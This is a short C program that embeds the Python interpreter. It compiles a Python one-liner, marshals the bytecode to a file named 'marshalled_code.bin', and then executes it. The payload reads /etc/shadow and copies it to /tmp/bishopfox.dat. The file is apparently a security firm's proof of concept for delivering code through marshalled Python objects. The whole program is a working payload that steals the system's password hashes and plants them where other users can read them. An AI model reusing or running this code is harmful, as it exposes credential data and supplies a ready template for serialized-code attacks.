#include "Python.h"
#include <stdio.h>
 
int main(int argc, char **argv)
{ 
    PyGILState_STATE python_handle;
	PyCodeObject* code;
	FILE *output_fd;
	
	Py_Initialize();
	python_handle = PyGILState_Ensure();
	code = (PyCodeObject*) Py_CompileString("import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.dat', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();", "precompiled_code", Py_file_input);
	output_fd = fopen("marshalled_code.bin", "w");
    if(output_fd == NULL)
	{
        printf("open (output)\n");
        return 3;
    }
	PyMarshal_WriteObjectToFile(code, output_fd, 4);
	fclose(output_fd);
	
	PyObject* main_module = PyImport_AddModule("__main__");
    PyObject* global_dict = PyModule_GetDict(main_module);
    PyObject* local_dict = PyDict_New();
    PyObject* obj = PyEval_EvalCode(code, global_dict, local_dict);
	PyGILState_Release(python_handle);
	Py_Finalize();
 
    return (0);
}